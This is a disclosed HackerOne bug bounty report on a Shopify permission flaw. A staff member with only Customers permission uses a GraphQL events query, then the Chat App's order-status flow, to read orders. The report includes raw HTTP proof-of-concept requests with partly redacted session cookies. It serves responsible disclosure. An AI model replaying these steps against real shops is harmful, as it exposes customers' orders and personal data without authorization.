# Orders full read for a staff with only `Customers` permissions.

## Report Details
- **Report ID**: 1392032
- **URL**: https://hackerone.com/reports/1392032
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-11-05T05:21:35.036Z
- **Disclosed**: 2022-02-10T19:34:50.345Z

## Reporter
- **Username**: scaramouche31
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
A staff with only `Customers` permission can get full information about shop's orders. I consider it as an issue, because in Shopify's documentation it is explicitly said that you must have `Orders` (`read_orders`) permissions to be able to read shop's orders:
{F1504156} 
https://shopify.dev/api/usage/access-scopes

Prerequisite:
1. Shopify Chat App must be installed

## Steps To Reproduce:
1. Create a staff with only `Customers` permission.
2. As a staff use this query in your shop:

```
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=████; _secure_admin_session_id_csrf=██████; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxtTldaaU5tWTFOQzFpT0RjMExUUTRZV010WVdWbVpTMWpORGMyTWpFek9HTXpPRE1HT2daRlJnPT0iLCJleHAiOiIyMDIzLTExLTA1VDAyOjA2OjA0LjIzNFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--da4b3109537545abe8f385374146855a201c8e06; new_admin=1; koa.sid=███████; koa.sid.sig=█████; identity-state=BAhbAA%3D%3D--db43e3715865ca03e3123219ec91e34189be9380; localization=; cart_currency=USD; secure_customer_sig=; _secure_session_id=32a319afefb4a8db65b18c31bcef06c9; _orig_referrer=; _landing_page=%2Fpassword; _y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _shopify_y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _shopify_s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _ab=1; __ssid=43a93231-9d89-439b-aed1-824ac0b6e93d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 156
Dnt: 1
Te: trailers

{
"query":"query MyQuery { node(id: \"gid://shopify/Customer/5639003504696\") { ... on HasEvents { events(first: 10) { edges { node { message } } } } } }"
}
```


You can get customer's ID from Customers page. Use a customer that has some orders.
3. Observe the response, which will contain something like this:

```
"node":{
    "message":"Order Confirmation email for order \u003ca href=\"https:\/\/scara31-store4.myshopify.com\/admin\/orders\/4242972409912\"\u003e#1001\u003c\/a\u003e sent to this customer (aaa@aa.com)."
}
```


From this response we can get customer's order number `#1001` and email `aaa@aa.com`.
4. With installed Shopify Chat App go to the storefront -> Chat App -> Can I get an update on my order status? -> Enter order information
5. Use the information about order you got earlier, follow the generated link and receive full information about order.

To make sure, that it is not an intended behaviour, use this query as a staff to get price of the order you earlier accesed:
```
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=███; _secure_admin_session_id_csrf=███; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxtTldaaU5tWTFOQzFpT0RjMExUUTRZV010WVdWbVpTMWpORGMyTWpFek9HTXpPRE1HT2daRlJnPT0iLCJleHAiOiIyMDIzLTExLTA1VDAyOjA2OjA0LjIzNFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--da4b3109537545abe8f385374146855a201c8e06; new_admin=1; koa.sid=████████; koa.sid.sig=███; identity-state=BAhbAA%3D%3D--db43e3715865ca03e3123219ec91e34189be9380; localization=; cart_currency=USD; secure_customer_sig=; _secure_session_id=32a319afefb4a8db65b18c31bcef06c9; _orig_referrer=; _landing_page=%2Fpassword; _y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _shopify_y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _shopify_s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _ab=1; __ssid=43a93231-9d89-439b-aed1-824ac0b6e93d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 153
Dnt: 1
Te: trailers

{
"query":"query MyQuery { node(id: \"gid://shopify/Order/4287851397176\") { ... on Order { id, totalPrice } } }"
}
```

As a response you'll get:
```
"message":"Access denied for totalPrice field. Required access: `read_orders` access scope."
```


Possible remediation:
Order's number should not be leaked to a staff with only `Customers` permissions.

## Impact

A full access to Shop's Orders, which leads to sensitive Information Disclosure.

## Attachments
- _________.png
